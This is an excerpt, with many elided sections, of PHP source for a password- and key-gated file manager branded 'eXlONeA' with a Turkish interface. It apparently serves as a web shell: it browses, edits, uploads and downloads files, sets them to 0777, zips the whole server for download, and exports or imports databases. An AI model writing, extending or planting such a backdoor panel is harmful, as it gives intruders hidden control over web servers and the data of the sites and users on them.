...
if (isset($_POST['password'])) {
    if (md5($_POST['password']) === $PASSWORD_HASH) {
        ...
        $currentDir = realpath(isset($_GET['d']) ? sc($_GET['d']) : getcwd()) ?: getcwd();
        header("Location: ?d=" . urlencode(s($currentDir)) . "&key=" . $KEY_PARAM);
        exit;
...
$action = $_GET['action'] ?? '';
$currentDir = realpath(sc($_GET['d']) ?? getcwd()) ?: getcwd();
$error = '';
$success = '';
...
if (isset($_POST['db_logout'])) {
    ...
    header("Location: ?d=" . urlencode($currentDir) . "&key=" . $KEY_PARAM . "&open_db=1");
    exit;
}
...
if ($action === 'move' && isset($_POST['files'], $_POST['destination'])) {
    ...
    if ($destDir) {
        ...
        $success_link = ($destDir) ? '<a href="?d=' . urlencode($destDir) . "&key=" . $KEY_PARAM . '" class="btn btn-sm btn-info ms-2"><i class="bi bi-folder-check"></i> Dizine Git</a>' : '';
...
if ($action === 'copy' && isset($_POST['files'], $_POST['destination'])) {
    ...
    if ($destDir) {
        foreach ($files as $file) {
            ...
            if ($filePath && !file_exists($dest)) {
                if (is_dir($filePath)) { 
                    if(copyDirectory($filePath, $dest)) { $copied[] = htmlspecialchars(basename($file)); @chmod($dest, 0777); }
                    else { $error .= 'Klasör kopyalanamadı: ' . htmlspecialchars($file) . '<br>'; }
                }
    ...
    if (count($files) === 1) {
        ...
        if ($firstFile) {
            if (is_file($firstFile)) {
                ...
                if (ob_get_level()) ob_end_clean();
                header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . $filename . '"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($firstFile)); readfile($firstFile); exit;
            } else {
...
if (($action === 'directzip' || $action === 'download_zip') && isset($_POST['files'])) {
    ...
    if (!empty($files)) { if(!streamZip($files, $currentDir, $zipFileName)) $error = 'Zipleme hatası!'; } else $error = 'Dosya seçilmedi!';
}
if ($action === 'sunucuyaziple' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $hostname = getHostBaseName();
    $zipName = (count($files) === 1) ? basename($files[0]) . '.zip' : $hostname . '.zip';
...
if ($action === 'create_file' && isset($_POST['file_name'])) {
    ...
    if (!file_exists($filePath)) {
        if (@touch($filePath)) {
            if (file_put_contents($filePath, '') !== false) { @chmod($filePath, 0777); header("Location: ?d=" . urlencode($currentDir) . "&key=" . $KEY_PARAM . "&file_to_edit=" . urlencode($fileName)); exit; }
...
<body>
    ...
    <div class="container mt-4">
        <div class="d-flex justify-content-between align-items-center mb-2">
            <h2><a href="?d=<?php echo urlencode($baseDir); ?>&key=<?php echo $KEY_PARAM; ?>" style="text-decoration:none;color:inherit;">eXlONeA</a></h2>
            <div class="header-icons">
                <i class="bi bi-info-circle-fill" title="Sunucu Bilgileri" onclick="showServerInfo()"></i>
                <i class="bi bi-house-door-fill" title="Ana Dizin" onclick="window.location.href='?d=<?php echo urlencode($baseDir); ?>&key=<?php echo $KEY_PARAM; ?>'"></i>
            ...
            <ol class="breadcrumb">
                ...
                ?>
                    <li class="breadcrumb-item">
                        <a href="?d=<?php echo urlencode(s($b['path'])); ?>&key=<?php echo $KEY_PARAM; ?><?php echo $linkParams; ?>"><?php echo htmlspecialchars($crumb['name']); ?></a>
                    </li>
                <?php } ?>
        ...
        <?php
            ...
            $baseLink = "?d=" . urlencode($currentDir) . "&key=" . $KEY_PARAM . (!empty($searchTerm) ? "&action=search&query=" . urlencode($searchTerm) . "&search_type=" . urlencode($searchType) : "") . $linkParams;
                ...
                <tbody>
                    ...
                    <tr data-file-name=".." data-file-type="dir" data-perms="-" data-mtime="">
                        ...
                        <td>
                            ...
                            <a href="?d=<?php echo urlencode($parentDir); ?>&key=<?php echo $KEY_PARAM; ?><?php echo $linkParams; ?>">..</a>
                        </td>
                        <td>-</td>
                        <td>-</td>
                        <td>-</td>
                    ...
                    foreach ($files as $file) { 
                        ...
                        $onClick = $file['type'] === 'file' && !$isImage ? "openEditModal('" . htmlspecialchars($file['path'], ENT_QUOTES) . "'); return false;" : "return true;";
                    ?>
                    <tr data-file-name="<?php echo htmlspecialchars($file['name']); ?>" data-file-path="<?php echo htmlspecialchars($file['path']); ?>" data-file-type="<?php echo $file['type']; ?>" data-perms="<?php echo $file['perms']; ?>" data-mtime="<?php echo $file['mtime'] ? date('Y-m-d H:i:s', $file['mtime']) : ''; ?>" data-ctime="<?php echo $file['ctime'] ? date('Y-m-d H:i:s', $file['ctime']) : ''; ?>" data-file-url="<?php echo htmlspecialchars($fileUrl); ?>">
                        <td><input type="checkbox" name="file[]" value="<?php echo htmlspecialchars($file['path']); ?>" onchange="updateFileSelection()" class="custom-checkbox-style"></td>
                        <td>
                            <i class="<?php echo $file['icon']; ?> file-icon"></i>
                            <?php if ($file['type'] === 'dir' && !$isRecursiveMode) { ?>
                                <a href="?d=<?php echo urlencode($file['path']); ?>&key=<?php echo $KEY_PARAM; ?>" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($file['name']); ?></a>
                            ...
                            <?php } elseif ($file['type'] === 'file') { ?>
                                <a href="#" onclick="openEditModal('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>'); return false;" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($displayName); ?></a>
                            <?php } else { ?>
        ...
        <div class="modal fade" id="moveModal" tabindex="-1" aria-labelledby="moveModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    ...
                    <form method="POST" action="?action=move&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="moveForm">
        ...
        <div class="modal fade" id="copyModal" tabindex="-1" aria-labelledby="copyModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    ...
                    <form method="POST" action="?action=copy&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="copyForm">
        ...
        <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-xl">
                <div class="modal-content">
                    ...
                    <form method="POST" id="editForm" action="?action=edit&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
        ...
        <div class="modal fade" id="createFolderModal" tabindex="-1" aria-labelledby="createFolderModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    ...
                    <form method="POST" action="?action=create_folder&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
        ...
        <div class="modal fade" id="createFileModal" tabindex="-1" aria-labelledby="createFileModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    ...
                    <form method="POST" action="?action=create_file&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
        ...
        <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    ...
                    <form method="POST" action="?action=rename&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="renameForm">
        ...
        <div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    ...
                    <form method="POST" action="?action=chmod&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="chmodForm">
        ...
        <div class="modal fade" id="touchModal" tabindex="-1" aria-labelledby="touchModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    ...
                    <form method="POST" action="?action=touch&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="touchForm">
                    ...
                    <div class="modal-body">
                        ...
                        <div class="tab-content pt-3">
                            <div class="tab-pane fade show active" id="file-upload" role="tabpanel">
                                <form method="POST" action="?action=upload&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data" id="fileUploadForm">
                            ...
                            <div class="tab-pane fade" id="url-download" role="tabpanel">
                                <form method="POST" action="?action=upload&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="urlUploadForm">
                    ...
                    <div class="modal-body">
                        ...
                        <div class="tab-content">
                            <div class="tab-pane fade show active" id="db-export">
                                <form method="POST" action="?action=database_export&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                            ...
                            <div class="tab-pane fade" id="db-import">
                                <form method="POST" action="?action=database_import&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data">
                                    <div class="mb-2"><input type="text" name="host" class="form-control" value="localhost" placeholder="Host" required></div>
                                    <div class="mb-2"><input type="text" name="user" class="form-control" placeholder="Kullanıcı Adı" required></div>
                                    <div class="mb-2"><input type="text" name="pass" class="form-control" placeholder="Şifre" value=""></div>
                                    <div class="mb-3"><input type="text" name="db" class="form-control" placeholder="Veritabanı Adı" required></div>
                            ...
                            <div class="tab-pane fade" id="db-advanced">
                                <?php if (!isset($_SESSION['db_host'])): ?>
                                    ...
                                    <form method="POST" action="?d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                                        ...
                                        <div class="col-md-9">
                                            <div class="tab-content">
                                                <div class="tab-pane fade" id="db-import-advanced" role="tabpanel">
                                                    ...
                                                    <form method="POST" action="?d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data">
                                                        ...
                                                        <div class="table-responsive">
                                                            <table class="table table-bordered table-sm table-hover" style="font-size:12px;" id="dbResultTable">
                                                                ...
                                                                <tbody>
                                                                    ...
                                                                    ?>
                                                                        <tr id="db-row-<?php echo $rowIndex; ?>">
    ...
    <script>
        ...
        function openEditModal(fileName) {
            ...
            const row = document.querySelector(`tr[data-file-path="${fileName.replace(/"/g, '&quot;')}"]`) || document.querySelector(`tr[data-file-name="${fileName.replace(/"/g, '&quot;')}"]`);
            if (row) {
            ...
            if (IS_RECURSIVE_MODE === 'true' || IS_SEARCH_CONTENT_RECURSIVE === 'true') {
            ...
            fetch(`?action=get_file_content&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>&file=${encodedFilePath}`).then(response => {
        ...
        function setSingleActionValues(action) {
            ...
            if (!row) return false;
            const fileDisplay = IS_RECURSIVE_MODE === 'true' || IS_SEARCH_CONTENT_RECURSIVE === 'true' ? filePath : row.getAttribute('data-file-name');
            ...
            if (action === 'rename') {
                ...
                document.getElementById('renameNewName').value = fileDisplay.split(/[\\/]/).pop();
        ...
        function openZipDownloadModal(action) {
            ...
            document.getElementById('zipDownloadFormFinal').action = `?action=${action}&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>`;
            document.getElementById('zipFileCount').textContent = selectedFiles.length;
            let defaultName;
            if (selectedFiles.length === 1) {
                const fileName = selectedFiles[0];
                const baseName = fileName.split(/[\\/]/).pop();
                let cleanName = baseName.includes('.') ? baseName.replace(/\.[^/.]+$/, "") : baseName; 
        ...
        function performTopluAction(action) {
            ...
            if (confirmed || action === 'download' || action === 'unzip' || action === 'sunucuyaziple') {
                ...
                form.method = 'POST';
                form.action = `?action=${action}&d=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>`;
